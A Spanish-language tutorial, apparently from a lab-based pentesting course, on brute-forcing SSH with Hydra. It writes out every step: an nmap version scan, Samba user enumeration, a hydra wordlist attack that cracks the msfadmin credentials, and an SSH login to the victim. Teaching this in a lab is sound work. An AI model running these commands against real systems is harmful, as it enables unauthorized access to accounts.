# 25. Fuerza Bruta a un SSH con Hydra

Vamos a ver a cómo realizar un ataque de fuerza bruta a un servicio SSH con Hydra.

## Escaneo con Nmap

Primero, vamos a hacer un escaneo:

```bash
nmap -sV <ip-host>
```

* `-sV` : Para que nos muestre la versión del servicio

Con esto, vamos a detectar la versión de los servicios que están corriendo en la máquina víctima.

```plaintext
PORT    STATE SERVICE     VERSION
...
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
...
```

La máquina devuelve que tiene el servicio SSH abierto, que es el que vamos a realizar el ataque de fuerza bruta. Y tiene varios servicios más.
Tiene el servicio Samba, está es una máquina Linux.

En este caso, para realizar el ataque de fuerza bruta a SSH, necesitamos un *usuario* y una lista de contraseñas. O podemos tener una lista de
usuarios y una lista de contraseñas.

## Enumerando usuarios con Nmap

Para este caso, vamos a enumerar usuarios en la máquina de la víctima.

Vamos a usar un script de Nmap:

```bash
nmap --script=smb-enum-users <ip-host>
```

La máquina de la víctima está corriendo Samba, y con este script de Nmap podemos enumerar los usuarios en la máquina de la víctima del servicio
Samba.

Tenemos muchos usuarios, podemos agarrar todos los usuarios y clonarlos en una lista de usuarios, que vamos a utilizar previamente para realizar
el ataque de fuerza bruta.

Pero, tenemos un usuario `msfadmin`, una cuenta de usuario, que lo vamos a utilizar para el ataque de fuerza bruta.

## Hydra

Si hacemos un:

```bash
hydra
```

Para ver su uso. En este caso, haremos:

```bash
hydra -l msfadmin -P wordlist.txt <ip-host> -t 4 ssh
```

* Con `-L`, es para indicar una lista de usuarios. Ejemplo `-L wordlist.txt`
* `<ip-host>`: Previo a `-t`, tiene que ir la IP de la máquina víctima
* `-t`: Hilos de ejecución. Para SSH, se recomienda utilizar 4 (por default son 16)
* `ssh`: El servicio al que se va a hacer el ataque de fuerza bruta

Si hacemos:

```bash
cat wordlist.txt
```

Nos mostrará las palabras que tiene la wordlist que vamos ir probando ante el servicio SSH y logearnos. Vamos a ver cual de estas contraseñas funcionan.

Una vez ejecutado, veremos el usuario y la contraseña:

```plaintext
[22][ssh] host: 192.168.1.100   login: msfadmin   password: msfadmin
```

## Login con SSH

Nos logeamos vía SSH:

```bash
ssh msfadmin@<ip-host>
```

Ingresamos la contraeña y ya estamos dentro de la máquina víctima, utilizando las credenciales encontradas.

Ahora podemos ejecutar comandos:

```bash
ls
```